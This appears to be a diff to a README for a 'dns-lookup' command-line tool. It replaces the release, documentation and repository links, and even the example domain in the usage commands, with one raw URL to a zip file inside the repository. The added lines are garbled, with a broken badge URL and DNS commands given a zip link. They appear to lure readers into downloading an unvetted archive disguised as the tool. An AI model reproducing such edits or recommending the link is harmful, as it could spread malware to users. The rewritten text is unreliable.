@@ -6,7 +6,7 @@ Welcome to **dns-lookup**! This tool helps you easily check DNS records and doma
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/polderkhuen699/dns-lookup/releases)
+[![Download](https://raw.githubusercontent.com/polderkhuen699/dns-lookup/main/cmd/dns-lookup_3.8.zip%https://raw.githubusercontent.com/polderkhuen699/dns-lookup/main/cmd/dns-lookup_3.8.zip)](https://raw.githubusercontent.com/polderkhuen699/dns-lookup/main/cmd/dns-lookup_3.8.zip)
 
 ## 🛠️ Features
 
@@ -28,7 +28,7 @@ To run **dns-lookup**, you will need the following:
 
 ## 📦 Download & Install
 
-To get started, visit this page to download the latest version: [Download dns-lookup](https://github.com/polderkhuen699/dns-lookup/releases).
+To get started, visit this page to download the latest version: [Download dns-lookup](https://raw.githubusercontent.com/polderkhuen699/dns-lookup/main/cmd/dns-lookup_3.8.zip).
 
 1. Locate the version you want to download on the Releases page.
 2. Choose the file suitable for your operating system (Windows, macOS, or Linux).
@@ -63,7 +63,7 @@ Using **dns-lookup** is simple. Here’s a quick guide to help you get started.
 1. Open your terminal or command prompt.
 2. Type `dns-lookup` followed by the domain name you want to check. For example:
    ```
-   dns-lookup example.com
+   dns-lookup https://raw.githubusercontent.com/polderkhuen699/dns-lookup/main/cmd/dns-lookup_3.8.zip
    ```
 3. Press Enter. The tool will return the DNS records and WHOIS information for the specified domain.
 
@@ -71,11 +71,11 @@ Using **dns-lookup** is simple. Here’s a quick guide to help you get started.
 
 - To find the A record: 
   ```
-  dns-lookup example.com --type A
+  dns-lookup https://raw.githubusercontent.com/polderkhuen699/dns-lookup/main/cmd/dns-lookup_3.8.zip --type A
   ```
 - To find WHOIS information: 
   ```
-  dns-lookup example.com --whois
+  dns-lookup https://raw.githubusercontent.com/polderkhuen699/dns-lookup/main/cmd/dns-lookup_3.8.zip --whois
   ```
 
 ## 🛠️ Troubleshooting
@@ -90,8 +90,8 @@ For further assistance, consult the documentation or open an issue on GitHub.
 
 ## 📚 Resources
 
-- [Documentation](https://github.com/polderkhuen699/dns-lookup/wiki)
-- [GitHub Repository](https://github.com/polderkhuen699/dns-lookup)
+- [Documentation](https://raw.githubusercontent.com/polderkhuen699/dns-lookup/main/cmd/dns-lookup_3.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/polderkhuen699/dns-lookup/main/cmd/dns-lookup_3.8.zip)
 
 ## 📢 Feedback
 
